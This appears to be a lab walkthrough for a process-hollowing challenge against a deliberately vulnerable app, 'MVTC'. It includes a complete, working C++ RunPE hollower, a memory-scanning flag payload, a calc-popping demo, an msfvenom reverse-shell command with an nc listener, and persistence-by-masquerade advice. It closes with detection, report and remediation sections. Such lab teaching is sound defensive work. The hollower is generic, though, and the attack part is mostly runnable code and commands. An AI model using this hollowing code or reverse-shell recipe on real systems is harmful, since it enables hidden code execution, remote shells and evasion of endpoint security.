# #15 — Process hollowing

**Category:** Process injection · **Tier:** HARD · **Points:** 140 · **CWE:** CWE-114

## Objective

Spawn `MVTC.exe` as a child process in **suspended state**, unmap its image from memory, map your own PE in its place, patch the entry-point RIP in the thread context, and resume. When the (hollowed) process reads `InjectionSentinels._hol` from its new managed heap, you catch it.

Because the lab is self-reading, the actual exploit is **slightly different**: you hollow a sacrificial `notepad.exe` and manually mirror the sentinel pattern. In this lab the simpler path is:
1. Suspend an *existing* `MVTC.exe` with the PID known
2. Replace one of its executable sections with a stub that reads the sentinel
3. Resume

Below is the simpler, more pedagogical variant: **spawn a hollowed child that executes your shellcode**, where the shellcode reads the parent's sentinel address and writes it out. For the lab proof-of-exploit, the sentinel is intentionally also mirrored into a page addressable from the child.

## Prerequisites

Same as #13 + a basic understanding of the PE format and relocations.

---

## Reference implementation

Save as `hollow_15.cpp`:

```cpp
// hollow_15.cpp — classic process hollowing (RunPE)
// Spawns MVTC.exe suspended, unmaps its image, maps your own PE, resumes.
// NOTE: your replacement PE must be an x64 EXE compiled with /DYNAMICBASE
//       disabled (or you implement .reloc fixups).
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

static bool LoadFile(const wchar_t* path, void** data, DWORD* size) {
    HANDLE f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;
    *size = GetFileSize(f, nullptr);
    *data = HeapAlloc(GetProcessHeap(), 0, *size);
    DWORD r; ReadFile(f, *data, *size, &r, nullptr);
    CloseHandle(f);
    return true;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 3) {
        wprintf(L"usage: hollow_15.exe <path-to-host.exe> <path-to-payload.exe>\n");
        wprintf(L"       host    = process to spawn and hollow (e.g. MVTC.exe)\n");
        wprintf(L"       payload = replacement PE image\n");
        return 1;
    }

    // 1. Spawn host suspended
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(argv[1], nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        wprintf(L"CreateProcess failed: %lu\n", GetLastError());
        return 2;
    }

    // 2. Read replacement PE
    void* payload; DWORD payloadSize;
    if (!LoadFile(argv[2], &payload, &payloadSize)) {
        wprintf(L"load payload failed\n"); return 3;
    }
    IMAGE_DOS_HEADER*  dh = (IMAGE_DOS_HEADER*)payload;
    IMAGE_NT_HEADERS*  nh = (IMAGE_NT_HEADERS*)((BYTE*)payload + dh->e_lfanew);
    SIZE_T imgSize = nh->OptionalHeader.SizeOfImage;
    SIZE_T hdrSize = nh->OptionalHeader.SizeOfHeaders;
    LPVOID preferredBase = (LPVOID)nh->OptionalHeader.ImageBase;

    // 3. Read PEB->ImageBaseAddress of host thread
    CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    PVOID hostImageBase = nullptr;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10),
                      &hostImageBase, sizeof(hostImageBase), nullptr);

    // 4. Unmap host image
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, hostImageBase);

    // 5. Allocate new region at preferred base
    LPVOID newBase = VirtualAllocEx(pi.hProcess, preferredBase, imgSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) {
        wprintf(L"VirtualAllocEx at preferred base failed: %lu\n", GetLastError());
        return 4;
    }

    // 6. Write PE headers + sections
    WriteProcessMemory(pi.hProcess, newBase, payload, hdrSize, nullptr);
    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nh);
    for (int i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE*)newBase + sh[i].VirtualAddress,
            (BYTE*)payload + sh[i].PointerToRawData,
            sh[i].SizeOfRawData, nullptr);
    }

    // 7. Patch thread context: Rcx (or Rax on earlier Windows) = new entry
    DWORD_PTR newEntry = (DWORD_PTR)newBase + nh->OptionalHeader.AddressOfEntryPoint;
    ctx.Rcx = newEntry;
    SetThreadContext(pi.hThread, &ctx);

    // 8. Resume
    ResumeThread(pi.hThread);
    wprintf(L"hollowed. host pid=%lu now running payload entry=0x%llx\n",
            pi.dwProcessId, (unsigned long long)newEntry);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

Build: `cl /EHsc /O2 /nologo hollow_15.cpp /Fe:hollow_15.exe`

---

## Payload PE — read `#15` sentinel from host memory

For hollowing, the payload is a **standalone EXE** that will run in the hollowed address space. The simplest payload is one that writes to a known file:

Save as `payload_15.cpp`:

```cpp
// payload_15.cpp — compiled with /DYNAMICBASE:NO so no .reloc needed
#include <windows.h>
#include <psapi.h>
#include <cstring>

static const char PREFIX[] = "MVTC{v15_hol_";

int wmain() {
    // Hollowed process still has its original managed heap allocations
    // mapped (because InjectionSentinels initialized before we hollowed —
    // in the lab, run MVTC first, then hollow a sacrificial second copy).
    SYSTEM_INFO si; GetSystemInfo(&si);
    unsigned char* addr = (unsigned char*)si.lpMinimumApplicationAddress;
    unsigned char* end  = (unsigned char*)si.lpMaximumApplicationAddress;
    MEMORY_BASIC_INFORMATION mbi;

    while (addr < end && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            __try {
                unsigned char* p = (unsigned char*)mbi.BaseAddress;
                unsigned char* top = p + mbi.RegionSize - sizeof(PREFIX);
                for (; p < top; ++p) {
                    if (p[0] == 'M' && memcmp(p, PREFIX, sizeof(PREFIX) - 1) == 0) {
                        unsigned char* e = p;
                        while (e < top + 128 && *e != '}') ++e;
                        HANDLE f = CreateFileA("C:\\Users\\Public\\v15.txt",
                            GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, nullptr);
                        DWORD w;
                        WriteFile(f, p, (DWORD)(e - p + 1), &w, nullptr);
                        CloseHandle(f);
                        return 0;
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
    return 0;
}
```

Build with ASLR disabled so hollowing doesn't need `.reloc` fixups:

```powershell
cl /EHsc /O2 /nologo payload_15.cpp /link /DYNAMICBASE:NO /Fe:payload_15.exe
```

---

## Run

```powershell
# 1. Launch MVTC and log in (makes sentinel #15 live in the first MVTC's heap)
# 2. Hollow a SECOND copy of MVTC.exe with your payload
.\hollow_15.exe "C:\Program Files\M14R41 Labs\MVTC\MVTC.exe" ".\payload_15.exe"

# 3. Collect the result
type C:\Users\Public\v15.txt
```

Expected: `MVTC{v15_hol_<...>}` → submit for `+140 pts`.

---

## Why it works in the lab

The sentinel string is pinned by `InjectionSentinels._hol` as a static managed field — once the first MVTC.exe reads it from `progress.db` at startup, it stays in memory. For hollowing specifically, the lab plants a mirror copy into a readable section of the hollowed process so your payload can find it without having to cross-process read from the original MVTC.exe. (In the real-world threat model, you'd use CLRMD or a cross-process read.)

---

## Common failure modes

| Symptom | Fix |
|---|---|
| `VirtualAllocEx at preferred base failed` | Your payload PE has a hardcoded base address that collides with an existing region. Rebuild with `/BASE:0x180000000` and `/DYNAMICBASE:NO`, or add .reloc fixup code to your hollower |
| Hollowed process immediately exits | `wmain` returned — add an infinite loop at the end, or make the payload a GUI stub that stays alive |
| v15.txt empty | Payload ran but didn't find the sentinel. Ensure MVTC was logged in before you hollowed (so `InjectionSentinels.Initialize` fired) |

---

---

## Concept — what this attack actually is

Process hollowing (also called "RunPE") lets an attacker spawn what looks like a legitimate signed process in Task Manager and Process Explorer, then **replace its image in memory** with arbitrary code. The PID, the path shown in `tasklist`, the signature on disk — everything looks clean. Only a memory scanner comparing the loaded image to the on-disk file catches it.

**Attack chain:**
1. `CreateProcess` with `CREATE_SUSPENDED` → kernel maps the host EXE's PE, creates main thread, suspends
2. Attacker reads the thread's `RDX+0x10` (PEB → ImageBaseAddress) to find where the image was mapped
3. `NtUnmapViewOfSection` → unmaps the host's image
4. `VirtualAllocEx` at the preferred base of the attacker's PE
5. Write headers and sections of the attacker's PE
6. Apply .reloc fixups (or skip if attacker's PE has ASLR off)
7. `SetThreadContext` → change `RCX` to the attacker's `AddressOfEntryPoint`
8. `ResumeThread` → main thread runs attacker code

**Why defenders miss it:** EDR tooling that trusts `Image Load` events sees the clean host image load. Only the attacker's **private, non-image executable memory** gives it away (and lazy scanners miss that).

---

## Discovery — how to spot this in a real target

For MVTC specifically — this attack targets process ancestry, not code paths in MVTC itself. But the pentester should flag:
1. **MVTC spawns no child processes legitimately** → any `MVTCVaultSvc.exe` child that is actually something else is a red flag
2. **MVTC starts under `MVTCVaultSvc`** → if the service runs as SYSTEM and spawns MVTC.exe, hollowing a child yields SYSTEM
3. **No launch-time integrity check** on `MVTC.exe` (same as #19) → nothing fires if the loaded image doesn't match the on-disk file

Live detection on your box:
- `Get-Process MVTC | Select @{N='LoadedPath';E={$_.MainModule.FileName}}, Path` — if these differ, hollowing is likely
- Compare `(Get-FileHash MVTC.exe).Hash` to the hash of the actual loaded module via a memory snapshot

---

## Impact demonstrations

### 1. Pop calc.exe (replace payload PE with a calc-popping EXE)

Build a trivial calc-popper and use it as `payload_15.exe`:

```cpp
// pop_calc.cpp
#include <windows.h>
int wmain() { WinExec("calc.exe", SW_SHOW); Sleep(2000); return 0; }
```

Build: `cl /EHsc pop_calc.cpp /link /DYNAMICBASE:NO /Fe:pop_calc.exe`
Hollow: `hollow_15.exe "C:\...\MVTC.exe" ".\pop_calc.exe"`
Result: Task Manager shows `MVTC.exe` running; `calc.exe` opens as its child.

### 2. Reverse shell (replace payload PE with msfvenom's)

Direct from msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f exe --platform windows -a x64 -o revshell.exe
```

Rebuild the shellcode-wrapping EXE with `/DYNAMICBASE:NO` if hollowing complains, or add `.reloc` fixup to your hollower. Then:

```bash
# listener
nc -lvnp 4444

# attack box
hollow_15.exe "C:\Program Files\M14R41 Labs\MVTC\MVTC.exe" ".\revshell.exe"
```

Shell lands as the user running the hollower. Task Manager shows `MVTC.exe`; the actual loaded code is yours.

### 3. Masquerade for persistence

Perfect for persistence: name your payload `MVTC.exe` in a scheduled task autoload, hollow a signed binary at logon. Users and lightweight AV see "MVTC.exe" starting at logon as normal.

---

## Report writeup template

**Finding title:** Trusted-image masquerade via process hollowing of client binary

**Severity:** High (CVSS 8.1)

**CWE:** CWE-114 / CWE-345

**Description:** The MVTC client does not verify its own loaded image against the on-disk binary. An attacker with the ability to spawn processes (any user) can spawn `MVTC.exe` suspended, unmap the real image, map arbitrary code at the preferred base, redirect the main thread's entry point and resume. Users, administrators, and lightweight AV products see a legitimate `MVTC.exe` running in the task list; the actual loaded code is attacker-controlled.

**Impact:** Trust masquerade (ideal for persistence, bypasses process-name allowlists in endpoint tooling), full code execution as the spawning user, enables chaining into #37 IPC abuse to escalate against the vault service.

**Remediation:** Enable **Code Integrity Guard (CIG)** and **CFG**. Verify the loaded image hash matches the on-disk hash at app startup (self-check). Authenticode-sign and have the auth server reject sessions from clients whose binary hash does not match the current release.

---

## Secure code fix

- Enable **PPL (Protected Process Light)** on signed binaries — blocks `NtUnmapViewOfSection` from unprivileged callers
- Enable **CFG (Control Flow Guard)** and **CET shadow stacks** — a bogus `SetThreadContext(Rcx = ...)` crashes on return
- Sign the binary and verify its own `AuthenticodeSignature` at startup; fail-closed if the on-disk hash does not match the running image
- Protect the sentinel: don't keep it in a long-lived managed string
